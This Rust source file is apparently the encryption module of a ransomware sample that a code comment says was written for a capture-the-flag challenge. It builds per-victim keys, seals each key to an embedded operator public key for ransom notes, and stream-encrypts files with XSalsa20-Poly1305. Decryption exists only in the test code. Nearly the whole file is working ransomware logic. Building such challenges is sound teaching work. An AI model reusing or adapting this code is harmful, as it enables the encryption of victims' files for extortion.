use std::io::Read;

use bs58;
use dryoc::auth::Auth;
use dryoc::dryocbox;
use dryoc::dryocbox::DryocBox;
use dryoc::dryocsecretbox;
use dryoc::kdf;
use dryoc::types::{ByteArray, NewByteArray};
use poly1305::universal_hash::{KeyInit, UniversalHash};
use poly1305::Poly1305;
use salsa20::cipher::{KeyIvInit, StreamCipher};
use salsa20::XSalsa20;
use sha2::{Sha256, Digest};
use uuid::Uuid;
use zeroize::Zeroize;

const BLOCK_SIZE: usize = 2000;
static OPERATOR_PUBLIC_KEY: &'static [u8; 32] = include_bytes!("../assets/operator_public_key.bin");

#[derive(Clone)]
pub struct PerVictimKey {
    victim_id: Uuid,
    secret_key: dryocsecretbox::Key,
}

impl PerVictimKey {
    fn new(victim_id: Uuid, secret_key: dryocsecretbox::Key) -> Self {
        Self {
            victim_id,
            secret_key,
        }
    }
    pub fn generate(victim_id: Uuid) -> Self {
        Self::new(victim_id, dryocsecretbox::Key::gen())
    }
    pub fn dump(self: &Self) -> Vec<u8> {
        let mut serialized = Vec::new();
        serialized.extend_from_slice(self.victim_id.as_bytes());
        serialized.extend_from_slice(&self.secret_key.to_vec());
        serialized
    }
    pub fn parse(data: &[u8]) -> Option<Self> {
        if data.len() != 48 {
            return None;
        }
        data[0..16].try_into().ok().and_then(|victim_id| {
            data[16..48].try_into().ok().map(|mut secret_key| {
                let res = Self::new(
                    Uuid::from_bytes(victim_id),
                    dryocsecretbox::Key::from(&secret_key),
                );
                secret_key.zeroize();
                return res;
            })
        })
    }
    /// For use in ransom notes.
    pub fn seal_for_operator(&self) -> String {
        // Compute a HMAC with the encryption key as secret and the victim ID as message.
        // In case the same ransomware is dropped on a machine multiple times, the operator
        // should not demand for multiple payments. However with the current architecture we
        // would generate different secret keys for different runs.
        // The proof could be used to verify that multiple secret keys belong to the same victim.
        // This likely does not matter at all: we are authoring a CTF, not a real ransomware,
        // but we want to make it as realistic as possible.
        let identity_proof =
            Auth::compute_to_vec(self.secret_key.clone(), &self.victim_id.as_bytes());
        let kdf = kdf::Kdf::from_parts(self.secret_key.clone(), kdf::Context::default());
        let mut sk1: [u8; 32] = kdf.derive_subkey(1).unwrap();
        let mut sk2: [u8; 32] = kdf.derive_subkey(2).unwrap();
        let ephemeral_key = dryocbox::KeyPair::from_seed(&sk2);
        let mut sealed = ephemeral_key.public_key.to_vec();
        sealed.append(
            &mut DryocBox::encrypt_to_vecbox(
                &self.secret_key,
                &sk1[0..24].try_into().unwrap(),
                &OPERATOR_PUBLIC_KEY.into(),
                &ephemeral_key.secret_key,
            )
            .unwrap()
            .to_vec(),
        );
        sk1.zeroize();
        sk2.zeroize();
        format!(
            "{}:{}:{}",
            self.victim_id,
            bs58::encode(&identity_proof).into_string(),
            bs58::encode(&sealed).into_string()
        )
    }
}

pub struct EncryptedStreamHeader {
    sk_sha256: [u8; 32],
    nonce: dryoc::dryocsecretbox::Nonce,
    tag: [u8; 16],
}

impl EncryptedStreamHeader {
    pub fn to_vec(self: &Self) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&self.sk_sha256);
        v.extend_from_slice(self.nonce.as_array());
        v.extend_from_slice(&self.tag);
        v
    }
}

pub fn encrypt_stream(
    key: &PerVictimKey,
    input: &mut impl std::io::Read,
    output: &mut impl std::io::Write,
) -> std::io::Result<EncryptedStreamHeader> {
    // This is basically hand-rolled dryoc::secretbox::SecretBox, but works on stream.
    let mut header = EncryptedStreamHeader {
        sk_sha256: Sha256::digest(&key.secret_key.as_array()).into(),
        nonce: dryoc::dryocsecretbox::Nonce::gen(),
        tag: [0; 16],
    };
    let mut cipher = XSalsa20::new(
        key.secret_key.as_array().into(),
        header.nonce.as_array().into(),
    );
    let mut hash = Poly1305::new(key.secret_key.as_array().into());
    let mut buf: Vec<u8> = Vec::with_capacity(BLOCK_SIZE);
    loop {
        buf.clear();
        let n = input.take(BLOCK_SIZE as u64).read_to_end(&mut buf)?;
        if n == 0 {
            break;
        }
        cipher.apply_keystream(&mut buf);
        hash.update_padded(&buf);
        output.write_all(&buf)?;
    }
    header.tag = hash.finalize().as_array().clone();

    Ok(header)
}

#[cfg(test)]
fn decrypt_stream(
    key: &PerVictimKey,
    header: &EncryptedStreamHeader,
    input: &mut impl std::io::Read,
    output: &mut impl std::io::Write,
) -> std::io::Result<()> {
    if Sha256::digest(key.secret_key.as_array()) != header.sk_sha256.into() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Wrong secret key",
        ));
    }
    let mut cipher = XSalsa20::new(
        key.secret_key.as_array().into(),
        header.nonce.as_array().into(),
    );
    let mut hash = Poly1305::new(key.secret_key.as_array().into());
    let mut buf: Vec<u8> = Vec::with_capacity(BLOCK_SIZE);
    loop {
        buf.clear();
        let n = input.take(BLOCK_SIZE as u64).read_to_end(&mut buf)?;
        if n == 0 {
            break;
        }
        hash.update_padded(&buf);
        cipher.apply_keystream(&mut buf);
        output.write_all(&buf)?;
    }
    if hash.finalize().as_slice() != header.tag {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Invalid tag",
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_seal_per_victim_key() {
        let key = super::PerVictimKey::new(
            uuid::uuid!("01234567-89ab-cdef-0123-456789abcdef"),
            dryocsecretbox::Key::from([0; 32]),
        );
        assert_eq!(
            key.seal_for_operator(),
            "01234567-89ab-cdef-0123-456789abcdef:6M1m2bucY4682YNiteZ3mCfkMhzmS1ygec8DV2nLtdrS:zTLxgEp5TKuaVf7oRRuF3TkubA3Th87jhVa9kgU3c5A9E5YCwDUcTbtxVeV4DhgA5TV8sr6qqapJw1q5fCfAAfSmrrSe6Mr7rC8KYD4KgPoLs"
        );
    }
    #[test]
    fn test_block_size_make_sense() {
        // We would like BLOCK_SIZE to be multiplies of poly1305 block size, to
        // make sure the hash computation is independent of the block size. Rust
        //  does not have static assert so /shrug.
        assert_eq!(BLOCK_SIZE % poly1305::BLOCK_SIZE, 0);
    }
    #[test]
    fn test_stream_round_trip() {
        let key = PerVictimKey::generate(uuid::uuid!("01234567-89ab-cdef-0123-456789abcdef"));
        let mut input = std::io::Cursor::new(vec![0x11; 1379]);
        let mut output = std::io::Cursor::new(Vec::new());
        let header = encrypt_stream(&key, &mut input, &mut output).unwrap();
        assert_eq!(output.position(), 1379);
        let mut input = std::io::Cursor::new(output.into_inner());
        let mut output = std::io::Cursor::new(Vec::new());
        decrypt_stream(&key, &header, &mut input, &mut output).unwrap();
        assert_eq!(output.into_inner(), vec![0x11; 1379])
    }
}
